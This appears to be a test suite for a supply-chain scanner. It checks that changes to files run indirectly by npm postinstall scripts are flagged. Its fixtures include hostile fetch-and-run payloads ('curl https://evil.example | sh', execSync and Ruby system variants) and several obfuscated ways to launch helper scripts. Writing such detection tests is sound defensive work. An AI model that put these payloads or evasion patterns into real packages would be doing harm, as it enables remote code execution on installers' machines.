import { expect, test } from "bun:test";
import { prepass, type FileMap } from "../src/prepass.ts";

const enc = new TextEncoder();
const map = (f: Record<string, string>): FileMap => new Map(Object.entries(f).map(([k, v]) => [k, enc.encode(v)]));
const pj = (scripts: object) => JSON.stringify({ name: "x", version: "1", scripts });
const hard = (o: Record<string, string>, n: Record<string, string>) =>
  prepass("npm", map(o), map(n)).hard.filter((s) => s.kind === "install-script").map((s) => s.detail);
const evil = "require('child_process').execSync('curl https://evil.example | sh')\n";
const sh = "curl https://evil.example | sh\n";
const nj = (body: string) => ({
  "package.json": pj({ postinstall: "node scripts/install.js" }),
  "scripts/install.js": body,
  "tools/run.js": "1\n",
});
const pyE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "python3 install.py" }),
  "install.py": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const rbE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "ruby install.rb" }),
  "install.rb": body,
  [f]: "true\n",
  "README.md": "a\n",
});
const shE = (body: string, f: string) => ({
  "package.json": pj({ postinstall: "sh install.sh" }),
  "install.sh": body,
  [f]: "true\n",
  "README.md": "a\n",
});

function holds(base: Record<string, string>, file: string, bad: string) {
  const changed = hard(base, { ...base, [file]: bad });
  expect(changed.length).toBeGreaterThan(0);
  expect(changed.join(" ")).toMatch(new RegExp(file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")));
  expect(hard(base, base)).toEqual([]);
}

const cases: [string, Record<string, string>, string, string, boolean][] = [
  ["H1 python subprocess computed test/", pyE("import subprocess\nsubprocess.run(['sh','test/'+'run.sh'])\n", "test/run.sh"), "test/run.sh", sh, true],
  ["H2 python os.system computed docs/", pyE("import os\nos.system('sh docs/'+'run.sh')\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["H3 python computed .github/", pyE("import os\nos.system('sh .github/'+'run.sh')\n", ".github/run.sh"), ".github/run.sh", sh, true],
  ["H4 ruby load computed docs/", rbE("load 'docs/' + 'run.rb'\n", "docs/run.rb"), "docs/run.rb", "system('curl evil|sh')\n", true],
  ["H5 ruby system computed test/", rbE("system('sh test/' + 'run.sh')\n", "test/run.sh"), "test/run.sh", sh, true],
  ["H6 sh $N under docs/", shE("N=run\nsh \"docs/$N.sh\"\n", "docs/run.sh"), "docs/run.sh", sh, true],
  ["H7 sh $N under test/", shE("N=run\nsh \"test/$N.sh\"\n", "test/run.sh"), "test/run.sh", sh, true],
  ["H8 /bin/sh $N tools/", shE("N=run\n/bin/sh \"tools/$N.sh\"\n", "tools/run.sh"), "tools/run.sh", sh, true],
  ["H9 env bash $N tools/", shE("N=run\nenv bash \"tools/$N.sh\"\n", "tools/run.sh"), "tools/run.sh", sh, true],
  ["H10 sh tools/$N with if-guard", shE("N=run\nif true; then sh \"tools/$N.sh\"; fi\n", "tools/run.sh"), "tools/run.sh", sh, true],
  ["H11 execSync of identifier built by concat", nj("const cp=require('child_process');const c=['node','tools/run.js'].join(' ');cp.execSync(c)\n"), "tools/run.js", evil, false],
  ["H12 spawn node with array var", nj("const cp=require('child_process');const a=[require('path').join(__dirname,'..','tools','run.js')];cp.spawn(process.execPath,a)\n"), "tools/run.js", evil, false],
  ["H13 Worker hidden in require 2nd arg", nj("const {Worker}=require('worker_threads');const n='run';require('fs',new Worker(__dirname+'/../tools/'+n+'.js'))\n"), "tools/run.js", evil, false],
  ["H14 spawn hidden in eval-free fork 2nd arg", nj("const cp=require('child_process');const n='run';cp.fork(__dirname+'/../tools/run.js',[],cp.spawnSync(process.execPath,[__dirname+'/../tools/'+n+'.js']))\n"), "tools/run.js", evil, false],
  ["H15 execSync via String.concat", nj("const cp=require('child_process');cp.execSync('node '.concat(__dirname.slice(0,-7),'tools/run.js'))\n"), "tools/run.js", evil, false],
  ["H16 spawnSync shell string var test/", { ...nj("const cp=require('child_process');const t='test';cp.spawnSync('sh',[t.concat('/run.sh')])\n"), "test/run.sh": "true\n" }, "test/run.sh", sh, false],
];

for (const [name, base, file, bad, readmeQuiet] of cases) {
  test(`${name} holds, and the unchanged twin is quiet`, () => {
    holds(base, file, bad);
    if (readmeQuiet) expect(hard(base, { ...base, "README.md": "b\n" })).toEqual([]);
  });
}
